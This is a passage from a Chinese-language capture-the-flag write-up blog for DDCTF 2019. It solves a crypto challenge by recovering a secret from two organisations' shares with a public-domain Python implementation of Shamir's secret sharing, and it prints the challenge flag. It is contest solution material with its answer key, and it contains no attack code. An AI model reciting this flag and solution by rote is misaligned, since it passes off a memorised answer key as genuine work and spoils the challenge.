<p>p =<br>C53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4<br>E32D331535F08FC6338748C8447E72763A07F8AF7<br>组织1成员1 =<br>30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF5000<br>0B74A8B8D572B253E63473A0916B69878A779946A<br>组织1成员2 =<br>1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3<br>C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7<br>组织1成员4 =<br>1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF654<br>6BD09720D5D5F3E7BC1A401C8BD7300C253927BBC<br>组织2成员3 =<br>300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E<br>77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA<br>组织2成员4 =<br>1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022<br>957B0C0584199F02790AAC61D7132F7DB6A8F77B9<br>组织2成员5 =<br>9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67C<br>A8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</p>
</blockquote>
<p><a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing#Example" target="_blank" rel="noopener">shamir算法</a><br><a href="https://wenku.baidu.com/view/6f8ca4290066f5335a81215f.html" target="_blank" rel="noopener">简单解释</a><br>直接套用脚本：</p>
<pre><code>&#39;&#39;&#39;
The following Python implementation of Shamir&#39;s Secret Sharing is
released into the Public Domain under the terms of CC0 and OWFa:
https://creativecommons.org/publicdomain/zero/1.0/
http://www.openwebfoundation.org/legal/the-owf-1-0-agreements/owfa-1-0

See the bottom few lines for usage. Tested on Python 2 and 3.
&#39;&#39;&#39;

from __future__ import division
from __future__ import print_function

import random
import functools

# 12th Mersenne Prime
# (for this application we want a known prime number as close as
# possible to our security level; e.g.  desired security level of 128
# bits -- too large and all the ciphertext is large; too small and
# security is compromised)
_PRIME = 2**127 - 1
# 13th Mersenne Prime is 2**521 - 1

_RINT = functools.partial(random.SystemRandom().randint, 0)

def _eval_at(poly, x, prime):
    &#39;&#39;&#39;evaluates polynomial (coefficient tuple) at x, used to generate a
    shamir pool in make_random_shares below.
    &#39;&#39;&#39;
    accum = 0
    for coeff in reversed(poly):
        accum *= x
        accum += coeff
        accum %= prime
    return accum

def make_random_shares(minimum, shares, prime=_PRIME):
    &#39;&#39;&#39;
    Generates a random shamir pool, returns the secret and the share
    points.
    &#39;&#39;&#39;
    if minimum &gt; shares:
        raise ValueError(&quot;pool secret would be irrecoverable&quot;)
    poly = [_RINT(prime) for i in range(minimum)]
    points = [(i, _eval_at(poly, i, prime))
              for i in range(1, shares + 1)]
    return poly[0], points

def _extended_gcd(a, b):
    &#39;&#39;&#39;
    division in integers modulus p means finding the inverse of the
    denominator modulo p and then multiplying the numerator by this
    inverse (Note: inverse of A is B such that A*B % p == 1) this can
    be computed via extended Euclidean algorithm
    http://en.wikipedia.org/wiki/Modular_multiplicative_inverse#Computation
    &#39;&#39;&#39;
    x = 0
    last_x = 1
    y = 1
    last_y = 0
    while b != 0:
        quot = a // b
        a, b = b, a%b
        x, last_x = last_x - quot * x, x
        y, last_y = last_y - quot * y, y
    return last_x, last_y

def _divmod(num, den, p):
    &#39;&#39;&#39;compute num / den modulo prime p

    To explain what this means, the return value will be such that
    the following is true: den * _divmod(num, den, p) % p == num
    &#39;&#39;&#39;
    inv, _ = _extended_gcd(den, p)
    return num * inv

def _lagrange_interpolate(x, x_s, y_s, p):
    &#39;&#39;&#39;
    Find the y-value for the given x, given n (x, y) points;
    k points will define a polynomial of up to kth order
    &#39;&#39;&#39;
    k = len(x_s)
    assert k == len(set(x_s)), &quot;points must be distinct&quot;
    def PI(vals):  # upper-case PI -- product of inputs
        accum = 1
        for v in vals:
            accum *= v
        return accum
    nums = []  # avoid inexact division
    dens = []
    for i in range(k):
        others = list(x_s)
        cur = others.pop(i)
        nums.append(PI(x - o for o in others))
        dens.append(PI(cur - o for o in others))
    den = PI(dens)
    num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p)
               for i in range(k)])
    return (_divmod(num, den, p) + p) % p

def recover_secret(shares, prime=_PRIME):
    &#39;&#39;&#39;
    Recover the secret from share points
    (x,y points on the polynomial)
    &#39;&#39;&#39;
    if len(shares) &lt; 2:
        raise ValueError(&quot;need at least two shares&quot;)
    x_s, y_s = zip(*shares)
    return _lagrange_interpolate(0, x_s, y_s, prime)

def main():
    p=0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533
    a1=(1,0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E)
    a2=(2,0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6)
    a4=(4,0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D)
    b3=(3,0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61)
    b4=(4,0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8)
    b5=(5,0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510)
    shares=[a1,a2,a4,b3,b4,b5]
    r1=recover_secret(shares[:3],p)
    r2=recover_secret(shares[-3:],p)
    print(hex(r1))
    print(hex(r2))
    r3=r1^r2
    print(hex(r3))
    c1=(1,r1)
    c2=(2,r2)
    shares=[c1,c2]
    r4=recover_secret(shares,p)
    print(hex(r4))
    print(hex(r4)[2:-1].decode(&#39;hex&#39;))

if __name__ == &#39;__main__&#39;:
    main()
</code></pre><p>得到答案：</p>
<blockquote>
<p>0x5f9fa97581c7b20f16c60d61cf3973bc308f5014756e7e6679dfc1b1931e4ab9853f962def6eefe68fb3fba2263d5cd1b4c13ebf08a5efcd2a3db8bf65aeb401L<br>0xbf3f52eb038f641e2d8c1ac39e72e778611ea028eadcfcccf37b3f1fd1f619fcc44cf9f36f719997b6fbc1d31c234c3123284812b71a9b57f02422377bfafc85L<br>0xe0a0fb9e8248d6113b4a17a2514b94c45191f03c9fb282aa8aa4feae42e8534541736fde801f767139483a713a1e10e097e976adbfbf749ada199a881e544884L<br>0x44444354467b76463232686f6c4635686c357130576d72465a356b5a31444264574f474f626b7dL<br>DDCTF{vF22holF5hl5q0WmrFZ5kZ1DBdWOGObk}</p>
</blockquote>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/04/21/CTF/ddctf2019/">http://microvorld.com/2019/04/21/CTF/ddctf2019/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/04/21/CTF/plaidctf2019/" title="plaidctf2019"><span>< PreviousPost</span><br><span class="prevTitle">plaidctf2019</span></a><a class="nextSlogan" href="/2019/04/20/python/upgrade python3/" title="Ubuntu升级python3.7"><span>NextPost ></span><br><span class="nextTitle">Ubuntu升级python3.7</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DDCTF2019"><span class="toc-number">1.</span> <span class="toc-text">DDCTF2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#滴"><span class="toc-number">1.1.1.</span> <span class="toc-text">滴~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB-签到题"><span class="toc-number">1.1.2.</span> <span class="toc-text">WEB 签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-IMG"><span class="toc-number">1.1.3.</span> <span class="toc-text">Upload-IMG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#homebrew-event-loop"><span class="toc-number">1.1.4.</span> <span class="toc-text">homebrew event loop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#大吉大利，今晚吃鸡"><span class="toc-number">1.1.5.</span> <span class="toc-text">大吉大利，今晚吃鸡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql弱口令"><span class="toc-number">1.1.6.</span> <span class="toc-text">mysql弱口令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#北京地铁"><span class="toc-number">1.2.1.</span> <span class="toc-text">北京地铁</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lsb"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">lsb</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rgb"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">rgb</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wireshark"><span class="toc-number">1.3.</span> <span class="toc-text">wireshark</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MulTzor"><span class="toc-number">1.4.</span> <span class="toc-text">MulTzor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#联盟决策大会"><span class="toc-number">1.5.</span> <span class="toc-text">联盟决策大会</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>